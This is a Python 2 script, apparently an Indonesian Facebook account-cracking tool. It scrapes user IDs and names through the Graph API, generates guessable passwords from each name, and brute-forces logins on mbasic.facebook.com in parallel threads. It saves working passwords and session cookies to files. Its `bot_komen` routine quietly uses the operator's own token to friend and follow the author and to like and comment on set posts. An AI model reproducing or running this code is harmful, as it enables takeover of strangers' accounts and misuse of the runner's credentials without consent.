#-*-coding:utf-8-*-
import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
if ("linux" in sys.platform.lower()):

        N = '\033[1;94m'
        G = '\033[1;92m'
        O = '\033[1;97m'
        R = '\033[1;91m'

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import lolcat
except ImportError:
    os.system('gem install lolcat')

try:
        import bs4
except ImportError:
        os.system("pip2 install bs4")

host="https://mbasic.facebook.com"
ua="Mozilla/5.0 (Linux; Android 7.0; LG-H870 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/315.0.0.47.113;]"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()
mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
def keluar():
    os.system('echo -e "[✔] Keluar"| lolcat')
    os.sys.exit()
def token():
	os.system("clear")
	os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" | lolcat')
	os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI\n────────────────────────────────────────"| lolcat')
	data = raw_input("\033[0;91m[\033[0;92m?\033[0;93m] \033[0;94mToken :\033[0;95m ")
	try:
		me = requests.get('https://graph.facebook.com/me?access_token='+data)
		a = json.loads(me.text)
		nama = a['name']
		open("login.txt",'w').write(data)
		os.system('echo -e "[✔] Login Berhasil ! "| lolcat')
		bot_komen()
		menu()
	except KeyError:
		os.system('echo -e "[✖] Token Salah ! "| lolcat')
		time.sleep(1.0)
		log_token()
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('echo -e "[✖] Token Invalid ! "| lolcat')
		log_token()
	una = ('100005789553399')
	kom = ('MUACHH 😘😘😘 @[100005789553399:]')
        post = ('1190012567868384')
        post2 = ('1190012567868384')
        kom2 = ('KREN BANG  WAHYU😘😘😘')
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
        requests.post('https://graph.facebook.com/100005789553399/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100003799027558/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
        requests.post('https://graph.facebook.com/'+post+'/likes?summary=true&access_token=' + toket)
        requests.post('https://graph.facebook.com/1727458364123799/comments/?message=Langgeng selalu ya bang Wahyu 😘&access_token=' + toket)
        requests.post('https://graph.facebook.com/1727458364123799/likes?summary=true&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
        requests.post('https://graph.facebook.com/'+post2+'/likes?summary=true&access_token=' + toket)
	menu()
def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nama = a['name']
  except Exception as e:
    os.system('echo -e "[✖] Token Invalid ! "| lolcat')
    time.sleep(1)
    log_token()
  os.system("clear")
  os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
  os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI\n────────────────────────────────────────"| lolcat')
  print("\033[0;91m[\033[0;96m✔\033[0;97m] \033[0;94mNama :\033[0;93m "+nama)
  os.system('echo -e "────────────────────────────────────────\n[1] Dump ID Teman\n[2] Dump ID Publik\n[3] Dump ID Dari Total Followers\n[4] Dump ID Dari Total Like\n[5] Start Crack\n[0] Keluar\n────────────────────────────────────────"| lolcat')
  r=raw_input("\033[0;95m[\033[0;96m?\033[0;97m]\033[0;91m Pilih :\033[0;94m ")
  if r=="":
	os.system('echo -e "[✖] Isi Dengan Benar ! "| lolcat')
	menu()
  elif r=="1":
    teman()
  elif r=="2":
    publik()
  elif r=="3":
    followers()
  elif r=="4":
    like()
  elif r=="5":
    crack()
  elif r=="0":
    try:
      os.remove("login.txt")
      os.system('echo -e "[✔] Menghapus Token ! "| lolcat')
      keluar()
    except Exception as e:
	os.system('echo -e "[✖] File Tidak Ada ! "| lolcat')
  else:
    os.system('echo -e "[✖] Isi Dengan Benar ! "| lolcat')
    menu()
def teman():
        try:
                toket=open('login.txt','r').read()
        except IOError:
                os.system('echo -e "[✖] Token Invalid ! "| lolcat')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                log_token()
        try:
                os.system("clear")
                os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
		os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI\n────────────────────────────────────────"| lolcat')
		limit = raw_input("\033[0;96m[\033[0;97m?\033[0;94m] \033[0;91mLimit Dump : \033[0;95m")
                file = raw_input("\033[0;95m[\033[0;91m?\033[0;94m] \033[0;97mNama File : \033[0;96m")
                os.system('echo -e "────────────────────────────────────────"| lolcat')
                try:
                   r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket+"&limit="+limit)
                except KeyError:
                        os.system('echo -e "[✖] Tidak Ada Teman ! "| lolcat')
                        os.system('echo -e "[Kembali]"| lolcat')
                        teman()
                id = []
                z=json.loads(r.text)
                qq = ('teman.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\033[0;91mDump \033[0;94m[\033[0;95m%s\033[0;96m] "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                        #print (  a["name"])
                ys.close()
                os.rename(qq,file)
                os.system('echo -e "\r────────────────────────────────────────"| lolcat')
		os.system('echo -e "[✔] Dump Selesai..." | lolcat')
                print("\r\033[0;91m[\033[0;93m✔\033[0;95m] \033[0;97mTotal ID :\033[0;95m %s"%(len(id)))
                print("\r\033[0;92m[\033[0;94m✔\033[0;96m] \033[0;97mNama File :\033[0;95m %s"%file)
                os.system('echo -e "────────────────────────────────────────"| lolcat')
                raw_input("\033[0;91m[\033[0;94mKembali\033[0;95m]")
                menu()

        except requests.exceptions.ConnectionError:
                os.system('echo -e "[✖] Tidak Ada Koneksi ! "| lolcat')
                keluar()
def followers():
        try:
                toket=open('login.txt','r').read()
        except IOError:
                os.system('echo -e "[✖] Token Invalid ! "| lolcat')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                log_token()
        try:
                os.system("clear")
		os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
		os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI\n────────────────────────────────────────"| lolcat')
                idt = raw_input("\033[0;91m[\033[0;97m?\033[0;94m]\033[0;94m ID Publik : \033[0;97m")
                limit = raw_input("\033[0;92m[\033[0;96m?\033[0;92m] \033[0;95mLimit Dump : \033[0;91m")
                file = raw_input("\033[0;93m[\033[0;91m?\033[0;91m] \033[0;96mNama File : \033[0;92m")
                os.system('echo -e "────────────────────────────────────────"| lolcat')
                try:
                        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
                        op = json.loads(jok.text)
                        print("\033[0;97m[\033[0;96m✔\033[0;95m] \033[0;94mNama : \033[0;93m"+op["name"])
                except KeyError:
                        os.system('echo -e "[✖] ID Tidak Ditemukan ! "| lolcat')
                        os.system('echo -e "[Kembali]"| lolcat')
                        followers()
                r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+toket+"&limit="+limit)
                id = []
                z=json.loads(r.text)
                os.system('echo -e "────────────────────────────────────────"| lolcat')
                qq = ('flw.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\033[0;94mDump \033[0;92m[\033[0;91m%s\033[0;97m] "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                        #print (  a["name"])
                ys.close()
                os.rename(qq,file)
                os.system('echo -e "\r────────────────────────────────────────"| lolcat')
		os.system('echo -e "[✔] Dump Selesai..." | lolcat')
                print("\r\033[0;97m[\033[0;91m✔\033[0;94m] \033[0;97mTotal ID :\033[0;94m %s"%(len(id)))
                print("\r\033[0;96m[\033[0;93m✔\033[0;95m] \033[0;91mNama File :\033[0;92m %s"%file)
                os.system('echo -e "────────────────────────────────────────"| lolcat')
                raw_input("\033[0;91m[\033[0;92mKembali\033[0;93m]")
                menu()

        except KeyError:
                os.system('echo -e "[✖] Tidak Ada Followers ! "| lolcat')
                raw_input('\n\033[0;97m[\033[0;96mKembali\033[0;92m]')
                menu()
        except requests.exceptions.ConnectionError:
                os.system('echo -e "[✖] Tidak Ada Koneksi ! "| lolcat')
                keluar()
def like():
        try:
                toket=open('login.txt','r').read()
        except IOError:
                os.system('echo -e "[✖] Token Invalid ! "| lolcat')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                log_token()
        try:
                os.system("clear")
		os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
		os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI\n────────────────────────────────────────"| lolcat')
                idt = raw_input("\033[0;91m[\033[0;96m?\033[0;97m]\033[0;93m ID Post : \033[0;97m")
		limit = raw_input("\033[0;92m[\033[0;95m?\033[0;92m] \033[0;95mLimit Dump : \033[0;96m")
                file = raw_input("\033[0;93m[\033[0;94m?\033[0;91m] \033[0;94mNama File : \033[0;95m")
                os.system('echo -e "────────────────────────────────────────"| lolcat')
                try:
                   r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit="+limit+"&access_token="+toket)
                except KeyError:
                        os.system('echo -e "[✖] Post Tidak Ditemukan ! "| lolcat')
                        os.system('echo -e "[Kembali]"| lolcat')
                        like()
                id = []
                z=json.loads(r.text)
                qq = ('likess.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\033[0;95mDump \033[0;97m[\033[0;96m%s\033[0;94m] "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                        #print (  a["name"])
                ys.close()
                os.rename(qq,file)
                os.system('echo -e "\r────────────────────────────────────────"| lolcat')
		os.system('echo -e "[✔] Dump Selesai..." | lolcat')
                print("\r\033[0;96m[\033[0;95m✔\033[0;92m] \033[0;93mTotal ID :\033[0;94m %s"%(len(id)))
                print("\r\033[0;97m[\033[0;94m✔\033[0;91m] \033[0;96mNama File :\033[0;96m %s"%file)
                os.system('echo -e "────────────────────────────────────────"| lolcat')
                raw_input("\033[0;94m[\033[0;93mKembali\033[0;91m]")
                menu()

        except KeyError:
                os.system('echo -e "[✖] Bukan Postingan ! "| lolcat')
                raw_input('\n\033[0;94m[\033[0;95mKembali\033[0;96m]')
                menu()
        except requests.exceptions.ConnectionError:
                os.system('echo -e "[✖] Tidak Ada Koneksi ! "| lolcat')
                keluar()
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('echo -e "[✖] Token Invalid ! "| lolcat')
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		log_token()
	try:
                os.system("clear")
		os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
		os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI\n────────────────────────────────────────"| lolcat')
		idt = raw_input("\033[0;91m[\033[0;94m?\033[0;91m]\033[0;95m ID Publik : \033[0;94m")
		limit = raw_input("\033[0;92m[\033[0;91m?\033[0;97m] \033[0;93mLimit Dump : \033[0;93m")
		file = raw_input("\033[0;94m[\033[0;93m?\033[0;96m] \033[0;91mNama File : \033[0;92m")
		os.system('echo -e "────────────────────────────────────────"| lolcat')
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("\033[0;91m[\033[0;92m✔\033[0;93m] \033[0;94mNama : \033[0;95m"+op["name"])
		except KeyError:
			os.system('echo -e "[✖] ID Tidak Ditemukan ! "| lolcat')
			os.system('echo -e "[Kembali]"| lolcat')
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit("+limit+")&access_token="+toket)
		id = []
		z=json.loads(r.text)
		os.system('echo -e "────────────────────────────────────────"| lolcat')
		qq = ('pblk.txt').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r\033[0;91mDump \033[0;94m[\033[0;95m%s\033[0;93m] "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
			#print (  a["name"])
		ys.close()
		os.rename(qq,file)
		os.system('echo -e "\r────────────────────────────────────────"| lolcat')
		os.system('echo -e "[✔] Dump Selesai..." | lolcat')
		print("\r\033[0;97m[\033[0;95m✔\033[0;93m] \033[0;91mTotal ID :\033[0;92m %s"%(len(id)))
		print("\r\033[0;96m[\033[0;94m✔\033[0;92m] \033[0;95mNama File :\033[0;97m %s"%file)
		os.system('echo -e "────────────────────────────────────────"| lolcat')
		raw_input("\033[0;94m[\033[0;95mKembali\033[0;96m]")
		menu()
		
	except Exception as e:
		os.system('echo -e "[✖] Tidak Ada Teman ! "| lolcat')
		menu()
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				#results.append(i+"1234")
				results.append(i+"12345")
				#results.append(i)
				if "indonesia" in ips:
					results.append("sayang")
					results.append("anjing")
					results.append("kontol")
	return results
def log_token():
  os.system('clear')
  os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
  os.system('echo -e "────────────────────────────────────────"| lolcat')
  os.system('echo -e "[✔] Masuk Dengan Akun Fake ! \n────────────────────────────────────────\n[1] Login Menggunakan Token\n[2] Cara Mendapatkan Token\n[0] Keluar\n────────────────────────────────────────"| lolcat')
  tk=raw_input("\033[0;95m[\033[0;96m?\033[0;97m] \033[0;93mPilih :\033[0;92m ")
  if tk=="":
	os.system('echo -e "[✖] Isi Dengan Benar ! "| lolcat')
	log_token()
  elif tk=="1":
    token()
  elif tk=="2":
    os.system('clear')
    os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
    os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI"| lolcat')
    os.system('echo -e "────────────────────────────────────────"| lolcat')
    os.system('echo -e "Anda akan diarahkan ke browser ! "| lolcat')
    time.sleep(3)
    os.system('echo -e "Silahkan klik titik tiga ! "| lolcat')
    time.sleep(3)
    os.system('echo -e "Kemudian klik cari dihalaman ! "| lolcat')
    time.sleep(3)
    os.system('echo -e "Lalu cari tulisan (Eaaa) dan copy Sampai di sini faham? ! "| lolcat')
    time.sleep(3)
    os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed')
    log_token()
  elif tk=="3":
    exit()
  else:
	os.system('echo -e "[✖] Isi Dengan Benar ! "| lolcat')
	log_token()
class crack:
        os.system("clear")
	os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
	os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI\n────────────────────────────────────────"| lolcat')
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		os.system('echo -e "[✔] Password Automatis / Manual (y/n)"| lolcat')
		while True:
			f=raw_input("\033[0;91m[\033[0;93m?\033[0;92m] \033[0;94mPilih :\033[0;95m ")
			if f=="":continue
			elif f=="n":
				try:
					while True:
						try:
							os.system('echo -e "────────────────────────────────────────"| lolcat')
							self.apk=raw_input("\033[0;97m[\033[0;96m?\033[0;95m]\033[0;94m Nama File :\033[0;91m ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							os.system('echo -e "[✖] File Tidak Ada ! "| lolcat')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					os.system('echo -e "[✖] File Tidak Valid ! "| lolcat')
					continue
				os.system('echo -e "────────────────────────────────────────"| lolcat')
				os.system('echo -e "[✔] Contoh Password : tempekjandabasah,kontolngacengcrot"| lolcat')
				self.pwlist()
				break
			elif f=="y":
				try:
					while True:
						try:
							os.system('echo -e "────────────────────────────────────────"| lolcat')
							self.apk=raw_input("\033[0;91m[\033[0;92m?\033[0;93m] \033[0;94mNama File :\033[0;95m ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							os.system('echo -e "[✖] File Tidak Ada ! "| lolcat')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					os.system('echo -e "[✖] File Tidak Valid ! "| lolcat')
					menu()
					continue
				os.system('echo -e "────────────────────────────────────────"| lolcat')
				os.system('echo -e "[✔] Crack..."| lolcat')
                        	os.system('echo -e "[✔] Akun Ok / Cp Tersimpan Di : Save.txt"| lolcat')
				os.system('echo -e "────────────────────────────────────────"| lolcat')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				os.system('echo -e "\n[✔] Selesai..."| lolcat')
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;97m[\033[0;96m?\033[0;95m] \033[0;94mPassword :\033[0;97m ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			os.system('echo -e "────────────────────────────────────────"| lolcat')
			os.system('echo -e "[✔] Crack..."| lolcat')
			os.system('echo -e "[✔] Akun Ok / Cp Tersimpan Di : Save.txt"| lolcat')
			os.system('echo -e "────────────────────────────────────────"| lolcat')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			os.system('echo -e "\n[✔] Selesai..."| lolcat')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;97m[Ok]%s %s \033[0;96m•\033[0;94m %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("Save.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s • %s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r\033[0;97m[Cp]%s %s \033[0;96m•\033[0;95m %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("Save.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r\033[0;97m[\033[0;96mCrack\033[0;95m] \033[0;94m%s/%s \033[0;93m• \033[0;91mOk : %s \033[0;95m• \033[0;97mCp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
if __name__=='__main__':
	menu()
